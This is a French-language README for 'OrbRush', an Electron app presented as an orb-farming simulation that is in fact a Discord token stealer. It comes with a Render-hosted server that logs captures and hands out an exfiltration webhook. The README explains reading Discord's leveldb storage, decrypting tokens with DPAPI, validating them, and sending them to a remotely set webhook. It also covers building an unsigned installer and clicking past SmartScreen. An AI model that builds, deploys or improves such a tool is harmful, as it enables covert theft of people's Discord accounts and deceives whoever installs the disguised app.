# OrbRush

Deux briques :

1. **L'app Windows** (Electron) : capture le token Discord local, design anime, simulation de farm d'orbs.
2. **Le serveur** (Node/Express, deployable sur Render) : distribue l'URL du webhook et affiche les captures.

La personne qui lance l'app n'a **rien** a configurer. Le webhook est pilote a distance depuis le dashboard.

---

## 1. Deployer le serveur sur Render

### Option A - Blueprint (recommande)

1. Pousse ce depot sur GitHub.
2. Render -> New -> Blueprint -> selectionne le depot.
3. Render lit `render.yaml` et cree le service.
4. Renseigne les variables demandees :
   - `ADMIN_KEY` : ta cle secrete pour le dashboard (longue chaine aleatoire).
   - `DEFAULT_WEBHOOK` : ton URL de webhook Discord (peut rester vide, tu la mettras via le dashboard).

### Option B - Manuel

    Type    : Web Service
    Runtime : Node
    Build   : npm install
    Start   : node server/index.js
    Env     : ADMIN_KEY, DEFAULT_WEBHOOK

### Persistance

Le plan gratuit Render a un disque ephemere : `server/data/` est vide a chaque redeploiement.

- soit tu gardes `DEFAULT_WEBHOOK` defini dans les variables d'environnement,
- soit tu ajoutes un disque persistant (plan payant) monte sur le dossier `server/data`
  et tu definis `DATA_DIR` sur ce chemin.

---

## 2. Configurer le webhook

Ouvre l'URL Render, saisis la cle admin, colle l'URL du webhook Discord, clique sur **Enregistrer**,
puis sur **Tester** pour verifier.

Recuperer une URL de webhook : salon Discord -> Parametres du salon -> Integrations -> Webhooks.

---

## 3. Brancher l'app sur ton serveur

Dans `electron/remote.js`, remplace :

    const DEFAULT_SERVER = 'https://orbrush.onrender.com';

par l'URL de ton service Render. C'est la seule ligne a changer.

Optionnel : `FALLBACK_WEBHOOK` permet de coder en dur un webhook de secours si le serveur dort.

---

## 4. Construire l'installeur

    npm install
    npm run dist

Genere `release/OrbRush-1.1.0-setup.msi`.

Alternative `.exe` :

    npm run dist:exe

Mode dev :

    npm start

---

## Antivirus / SmartScreen

- Electron + installeur MSI (WiX) : aucun script exotique, rien de suspect pour Windows Defender.
- L'installeur n'etant pas signe, SmartScreen peut afficher un avertissement :
  Informations complementaires -> Executer quand meme.
- Aucune dependance native : pas de compilation C++ au build.

---

## Fonctionnement de la capture

1. Lecture des dossiers `Local Storage/leveldb` de Discord, Discord PTB, Canary et Development.
2. Recherche du token en clair, sinon dechiffrement DPAPI via PowerShell (scope utilisateur courant).
3. Validation du token aupres de l'API Discord pour identifier le compte.
4. Resolution du webhook : serveur distant -> webhook local -> cache -> defaut.
5. Envoi d'un embed complet, puis journalisation de la capture sur le serveur.

---

## API du serveur

| Methode | Route | Auth | Description |
| --- | --- | --- | --- |
| GET | /api/health | non | Etat du service |
| GET | /api/config | non | Webhook courant (lu par l'app) |
| POST | /api/capture | non | Journalise une capture |
| GET | /api/captures | oui | Liste les captures |
| DELETE | /api/captures | oui | Vide l'historique |
| POST | /api/config | oui | Definit le webhook |
| POST | /api/test | oui | Envoie un message de test |
| GET | /api/check | oui | Verifie la cle admin |

L'auth se fait via l'en-tete `x-admin-key`.

---

## Structure

    electron/main.js          processus principal, fenetre, IPC, resolution du webhook
    electron/preload.js       pont securise renderer <-> main
    electron/remote.js        appel au serveur Render (config + log)
    electron/grabber.js       detection et dechiffrement du token
    electron/webhook.js       construction et envoi du payload Discord
    src/index.html            interface
    src/styles.css            design et animations
    src/renderer.js           logique de l'interface
    server/index.js           API Express
    server/store.js           persistance JSON
    server/public/            dashboard admin
    render.yaml               blueprint Render

---

## Prerequis

- Windows 10/11 x64
- Node.js 18+
- Connexion internet au premier build (electron-builder telecharge Electron et WiX)
